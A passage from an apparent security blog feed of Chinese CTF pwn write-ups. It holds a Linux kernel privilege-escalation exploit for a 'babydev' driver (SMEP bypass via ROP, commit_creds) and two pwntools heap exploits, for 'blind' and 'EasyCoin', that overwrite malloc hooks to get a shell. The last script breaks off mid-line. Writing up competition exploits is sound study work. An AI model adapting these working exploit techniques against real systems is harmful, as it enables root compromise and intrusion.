class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> ( * commit_creds )(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"><span class="keyword">size_t</span>* (* prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="keyword">size_t</span> xchg_esp_eax = <span class="number">0xFFFFFFFF81007808</span>;<span class="comment">//0xffffffff8100008a;</span></span><br><span class="line"><span class="keyword">size_t</span> iretq  = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="keyword">size_t</span> p_rdi  = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="keyword">size_t</span> write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>;</span><br><span class="line"><span class="comment">//unsigned long user_cs, user_ss, user_eflags;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span><span class="params">()</span></span>&#123;</span><br><span class="line">commit_creds= <span class="number">0xffffffff810a1420</span>;</span><br><span class="line">prepare_kernel_cred =<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">commit_creds(cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">tty_operations</span> <span class="title">tty_operations</span>;</span></span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">size_t</span> data[<span class="number">0X50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"====================start======================="</span>);</span><br><span class="line">tty_operations.ioctl = xchg_esp_eax;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> *fake_chunk ; </span><br><span class="line"><span class="comment">//memset(data,0,0x30);</span></span><br><span class="line">save_stats();</span><br><span class="line"><span class="keyword">int</span> fd1=<span class="number">-1</span>,fd2=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> trag[<span class="number">0x100</span>];</span><br><span class="line">fd1 = open(<span class="string">"/dev/babydev"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd1==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fd1 open error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fd: %d"</span>,fd1);</span><br><span class="line">fd2 = open(<span class="string">"/dev/babydev"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd2==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fd2 open error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fd: %d"</span>,fd2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================free chunk====================="</span>);</span><br><span class="line"><span class="comment">//ioctl(fd1,0x10001,0x2e0);</span></span><br><span class="line">ioctl(fd2,<span class="number">0x10001</span>,<span class="number">0x3e0</span>);</span><br><span class="line">close(fd2);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================build mem ====================="</span>);</span><br><span class="line">fake_chunk = mmap(xchg_esp_eax &amp; <span class="number">0xfffff000</span>, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"build fake chunk at mem : %llx\n"</span>,fake_chunk);</span><br><span class="line">data[<span class="number">0</span>] = p_rdi ;</span><br><span class="line">data[<span class="number">1</span>] = <span class="number">0x6f0</span> ; </span><br><span class="line">data[<span class="number">2</span>] = write_cr4 ; </span><br><span class="line">data[<span class="number">3</span>] = getroot;</span><br><span class="line">data[<span class="number">4</span>] = swapgs;</span><br><span class="line">data[<span class="number">5</span>] = fake_chunk+<span class="number">0x1000</span>;</span><br><span class="line">data[<span class="number">6</span>] = iretq;</span><br><span class="line">data[<span class="number">7</span>] = getshell;</span><br><span class="line">data[<span class="number">8</span>] = user_cs;</span><br><span class="line">data[<span class="number">9</span>] = user_eflags;</span><br><span class="line">data[<span class="number">10</span>]= user_sp;</span><br><span class="line">data[<span class="number">11</span>]= user_ss;</span><br><span class="line"><span class="built_in">memcpy</span>(xchg_esp_eax &amp; <span class="number">0xffffffff</span>,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================SET VTABLE====================="</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0xff</span>;i++)&#123;</span><br><span class="line">trag[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="keyword">if</span> (trag[i] &lt;= <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i = read(fd1,buff,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read: %d\n"</span>,i);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span> ;i &lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%llx\n"</span>,(<span class="keyword">size_t</span> )*(buff+i*<span class="number">8</span>)); </span><br><span class="line">&#125;</span><br><span class="line">*(<span class="keyword">size_t</span> *)(buff+<span class="number">3</span>*<span class="number">8</span>) = &amp;tty_operations;</span><br><span class="line">write(fd1,buff,<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n=================trag vul====================="</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0xff</span>;i++)&#123;</span><br><span class="line">ioctl(trag[i],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//printf("%d",i);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      一道想调但拖了很久的题目，主要是对题目中涉及到源码的分析。
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯CTF部分PWN题复现</title>
    <link href="http://p4nda.top/2018/08/27/WDBCTF-2018/"/>
    <id>http://p4nda.top/2018/08/27/WDBCTF-2018/</id>
    <published>2018-08-27T08:05:49.000Z</published>
    <updated>2018-08-27T14:37:47.925Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1QTwFBy5sbEcSLAadj7jRNg" target="_blank" rel="noopener">题目链接</a>  <strong><em>密码: 4qbr</em></strong> </p><h1 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h1><p>首先是blind题目，感觉我的做法和网上放的WP有点不一样，看网上放的EXP都是通过劫持.bss段上的STDOUT指针然后通过printf函数触发，学习了一波。</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>题目中给出3个功能，new、change、release。</p><p>new：可以申请6个堆块，堆块大小固定为0x68（实际分配0x70）大小的堆块，而在向堆块读入时会在读入数据后加\x00。</p><p><img src="/img/wdb2018/1-1.png" alt=""></p><p>change: 没有什么特别的操作，只是单纯的根据bss段上的指针数组找到相应的堆块，然后限制写入大小为0x68.</p><p><img src="/img/wdb2018/1-2.png" alt=""></p><p>release：可以看到限制了release的次数，而这个变量在bss段上，并且在free以后没有对指针数组置零，形成悬垂指针，从而具有UAF、Double Free漏洞。</p><p><img src="/img/wdb2018/1-3.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题利用的难点在于这个程序没有泄露的功能和位置。</p><p>程序开启了除PIE的全部保护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/p4nda/Desktop/pwn/other/blind/blind&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>利用想法首先是利用Double Free和UAF了，由于程序操作的堆块大小都是0x70的，所以很直观的想法就是劫持0x70这个fastbin链，而对于0x70这个数值很敏感，由于libc内存地址是0x7fxxxxxx，因此可以通过错位构造，将__malloc_hook-0x23这个块被分配，但由于没有libc地址泄露，此方法不可行。然而，在bss段上还有另外的0x7fxxx，就是STDIN、STDOUT、STDERR，</p><p><img src="/img/wdb2018/1-4.png" alt=""></p><p>而如果查看x/5gx 0x602045-8作为堆块，就会发现这个堆块大小为0x7f，当在fastbin链上的话，是可以分配的。</p><p><img src="/img/wdb2018/1-5.png" alt=""></p><p>而这时，我们就可以对bss段进行写入，造成任意地址写了。但是由于got表不可以改，因此泄露成为一个问题。我想到的思路是让libc地址恰好出现在bss段上ptr[]数组内，这样就可以对libc地址进行任意写了。</p><p>又想到，当free时，是不会检查free的大小和位置的，只要任意构造符合要求的堆块大小就可以使其被释放到bin中，而在unsorted bin中的堆块，fd和bk会指向main_arena+88，这样就可以写libc了。</p><p>因此通过在bss段上构造一个地址为ptr-0x10，大小为0x100的内存块，然后将其free，就可以使ptr[0],ptr[1]指向main_arena+88了。</p><p><img src="/img/wdb2018/1-6.png" alt=""></p><p>可以看到，堆块构造如上图，构造过程中必须保证0x100大小块的下一块标志位为1，并且构造下两块的标志位也为1，否则无法过free的检查。</p><p>在free掉该块以后，发现伪造的堆块进入unsorted bin。</p><p><img src="/img/wdb2018/1-7.png" alt=""></p><p>当再次编辑时就可以修改bss段了，但是在这时发现一个特点，在这个版本的libc中将main<em>arena+88的最低位改成\x00，恰好变成\</em>_malloc_hook-0x10。因此找到一个新的想法，题目所用的编辑函数中会在输入的末位写\x00，可以将ptr[4]，指向ptr[0]，在编辑时，可以将ptr[0]写成__malloc_hook-0x10，这样再次编辑ptr[0]就可以将__malloc_hook改成题目中给的system(“/bin/sh”)函数，从而拿到shell了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'./blind'</span>)</span><br><span class="line">ct  = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">"Done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,p64(<span class="number">0x602045</span><span class="number">-8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'p4nda\n'</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0x101</span>)*<span class="number">2</span>+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x602060</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x602140</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">4</span>,p64(<span class="number">0x21</span>)*<span class="number">12</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x4008E3</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="EasyCoin"><a href="#EasyCoin" class="headerlink" title="EasyCoin"></a>EasyCoin</h1><p>这题是AAA战队的ZUHXS师傅发给我的，也是遇上了一个神奇问题，在给我发的i64文件中switch语句没显示default，我也是懒没看汇编，就漏掉了格式化字符串漏洞 www</p><p><img src="/img/wdb2018/2-0.png" alt=""> <img src="/img/wdb2018/2-0-1.png" alt=""></p><p>言归正传，这题最开始并没有什么想法，只是发现了功能实现上存在问题，可以给用户自身发送coin，然后delete时会存在一个不可控的free。最后根据别人的EXP调出来的，膜做出此题的师傅…</p><h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>题目的功能比较多，首先是注册和登录，注册功能中有这样一个结构体：</p><p><img src="/img/wdb2018/2-1.png" alt=""></p><p>其中username、password和结构体本身都是malloc(0x20)得到的0x30的内存块，coin_list这个指针最开始是置空的，后续操作中会用到。</p><p>在登录以后程序会维护一个结构体指针，根据这个指针指向的s_user结构体进行操作,共有display_user、send_coin、display_transaction、change_passwd、delete_user、logout操作。</p><p>在send_coin中出现了新的结构体s_coin</p><p><img src="/img/wdb2018/2-2.png" alt=""></p><p>这个结构体是一个单链表，每一笔交易发生时，会分别向发送者和接受者新建并插入这个结构体，用id来标识交易，in_out标识是收到还是支出。同样的这个s_coin结构体也是也0x30大小的块。</p><p>在change_passwd函数中，会向结构体中指向的passwd指针写入数据。</p><p>最终delete_user中，会首先释放username、passwd指针，然后变量coin_list的所有coin，并从其他用户的coin_list中移除相应的s_coin并释放。</p><p><img src="/img/wdb2018/2-3.png" alt=""></p><p><img src="/img/wdb2018/2-4.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在整个程序中，只找到了用户可以向自己发送coin，而在delete时会触发一个释放位置地址的漏洞。</p><p>而程序在输入指令时，可以触发一个格式化字符串漏洞，通过格式化字符串漏洞可以泄露libc、堆地址。</p><p>此题的难点在于如何利用程序逻辑来对堆块进行UAF。</p><p>首先在释放的用户存在一个正常块时，释放后，由于不会对用户的coin_list进行操作，导致该链会指向fastbin链中的已释放部分。若正常逻辑也不会受到影响，但在这个coin_list上存在对自身转账的块时，就会在fastbin上寻找coin去释放，仅需利用fastbin上的脏数据即可释放一个正在用的块。</p><p>如图是释放了username、password的fastbin结构</p><p><img src="/img/wdb2018/2-5.png" alt=""></p><p>如图是释放了一对正常交易块的堆结构</p><p><img src="/img/wdb2018/2-6.png" alt=""></p><p>此时，可以看到该用户s_user指向的coin_list已经与fastbin有交集</p><p><img src="/img/wdb2018/2-7.png" alt=""></p><p>而可以看到此处是预留的脏数据，可以使其指向user2-&gt;password块</p><p><img src="/img/wdb2018/2-8.png" alt=""></p><p>而这个块中的id位置被预置为与当前查找的id相同，当运行到这里就可以使得user2-&gt;password被释放。</p><p><img src="/img/wdb2018/2-9.png" alt=""></p><p>当delete运行结束后，可以看到fastbin链上存在一个可修改的块</p><p><img src="/img/wdb2018/2-10.png" alt=""></p><p>而通过user2的change_passwd功能可以修改这个fastbin块的fd指针，如将其修改到user2本身的控制块结构体</p><p>此时被劫持的fastbin结构如下</p><p><img src="/img/wdb2018/2-11.png" alt=""></p><p>看到这样的堆结构，可以通过新建一个用户，在设置用户密码时可以覆写user2的控制块，将其password成员指向__free_hook。</p><p><img src="/img/wdb2018/2-12.png" alt=""></p><p>此时，由于password的只指向内容为\x00，因此使用\n就可登录，登录后修改密码为system地址。在delete时，</p><p>由于username是”/bin/sh”，就相当于调用了system(“/bin/sh”);</p><p>至此拿到了shell</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">'./EasyCoin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./EasyCoin'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x401474'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.20.44'</span>,  <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_coin</span><span class="params">(username, money)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_transactpn</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">reg(<span class="string">'/bin/sh\n'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'\x02'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">heap_base = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%3$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>)- <span class="number">0xf72c0</span><span class="comment">#- 7 - libc.symbols['__write_nocancel'] </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap  :'</span>,hex(heap_base)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,<span class="number">0x111</span>)</span><br><span class="line">delete()</span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,heap_base+<span class="number">0x100</span>)</span><br><span class="line">send_coin(<span class="string">'p4nda\n'</span>,<span class="number">0x3333</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line">send_coin(<span class="string">'/bin/sh'</span>,<span class="number">0x4444</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400b0f')</span></span><br><span class="line">change_password(p64(heap_base+<span class="number">0xa0</span><span class="number">-0x10</span>))</span><br><span class="line">logout()</span><br><span class="line">reg(<span class="string">"i_am_padding\n"</span>,p64(heap_base+<span class="number">0xd0</span>)+p64(libc.symbols[<span class="string">'__free_hook'</span>])+p64(<span 